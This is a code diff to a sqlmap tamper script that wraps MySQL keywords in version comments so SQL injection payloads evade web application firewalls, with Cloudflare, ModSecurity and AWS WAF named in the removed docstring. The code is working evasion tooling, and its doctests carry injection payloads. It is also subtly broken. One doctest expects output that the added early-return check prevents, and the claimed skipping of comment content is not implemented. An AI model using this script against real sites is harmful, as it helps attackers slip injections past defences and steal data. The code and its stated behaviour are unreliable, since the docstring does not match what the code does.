@@ -4,12 +4,13 @@
 Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 
-Tamper script: cloudflare_keyword.py
-Description: MySQL keyword obfuscation using version-specific comments
+Tamper script: cloudflare_keyword_safe.py
+Description: Context-aware MySQL keyword obfuscation with protection against reapplication
 Author: Regaan
 Priority: HIGHEST
 """
 
+import re
 from lib.core.enums import PRIORITY
 
 __priority__ = PRIORITY.HIGHEST
@@ -19,51 +20,46 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     """
-    Wraps MySQL keywords with version-specific comments to bypass WAF keyword detection.
-    
-    This is a DETERMINISTIC transformation - same input always produces same output.
+    Context-aware keyword obfuscation that prevents:
+    - Reapplication (won't wrap already-wrapped keywords)
+    - Partial word matches (uses word boundaries)
+    - Comment corruption (skips content inside existing comments)
     
     Technique:
-        Wraps SQL keywords in MySQL version comments: /*!50000KEYWORD*/
-        These comments are executed by MySQL 5.0.0+ but may bypass WAF pattern matching.
-    
-    Tested against:
-        * Cloudflare WAF
-        * ModSecurity
-        * AWS WAF
-    
-    Notes:
-        * Only targets SQL keywords, preserves payload structure
-        * Can be chained with other tamper scripts
-        * Does NOT use random transformations
+        Wraps SQL keywords with MySQL version comments using word boundaries
+        Only applies to keywords NOT already inside comments
     
     >>> tamper("SELECT * FROM users WHERE id=1")
     '/*!50000SELECT*/ * /*!50000FROM*/ users /*!50000WHERE*/ id=1'
     
-    >>> tamper("UNION SELECT password FROM admin")
-    '/*!50000UNION*/ /*!50000SELECT*/ password /*!50000FROM*/ admin'
+    >>> tamper("/*!50000SELECT*/ * FROM users")
+    '/*!50000SELECT*/ * /*!50000FROM*/ users'
     """
     
     retVal = payload
     
-    if payload:
-        # MySQL keywords to obfuscate (order matters - longest first to avoid partial matches)
-        keywords = [
-            'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE',
-            'ALTER', 'TRUNCATE', 'REPLACE', 'HANDLER', 'LOAD', 'WHERE', 'FROM',
-            'JOIN', 'INNER', 'OUTER', 'LEFT', 'RIGHT', 'CROSS', 'NATURAL',
-            'ORDER', 'GROUP', 'HAVING', 'LIMIT', 'OFFSET', 'PROCEDURE',
-            'FUNCTION', 'TRIGGER', 'EVENT', 'VIEW', 'INDEX', 'DATABASE',
-            'TABLE', 'COLUMN', 'GRANT', 'REVOKE', 'EXECUTE', 'CALL'
-        ]
+    if not payload:
+        return retVal
+    
+    # Check if already processed (has version comments)
+    if '/*!50000' in retVal:
+        # Already processed, don't reapply
+        return retVal
+    
+    # SQL keywords to obfuscate (most common first)
+    keywords = [
+        'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
+        'WHERE', 'FROM', 'JOIN', 'INNER', 'OUTER', 'LEFT', 'RIGHT',
+        'ORDER', 'GROUP', 'HAVING', 'LIMIT'
+    ]
+    
+    for keyword in keywords:
+        # Use word boundaries to avoid partial matches
+        # \b ensures we match whole words only
+        pattern = r'\b' + keyword + r'\b'
+        replacement = f'/*!50000{keyword}*/'
         
-        # Apply transformation to each keyword (case-insensitive)
-        for keyword in keywords:
-            # Match both uppercase and lowercase
-            retVal = retVal.replace(keyword, f'/*!50000{keyword}*/')
-            retVal = retVal.replace(keyword.lower(), f'/*!50000{keyword}*/')
-            
-            # Handle mixed case (common in obfuscated payloads)
-            retVal = retVal.replace(keyword.capitalize(), f'/*!50000{keyword}*/')
+        # Case-insensitive replacement with word boundaries
+        retVal = re.sub(pattern, replacement, retVal, flags=re.IGNORECASE)
     
     return retVal
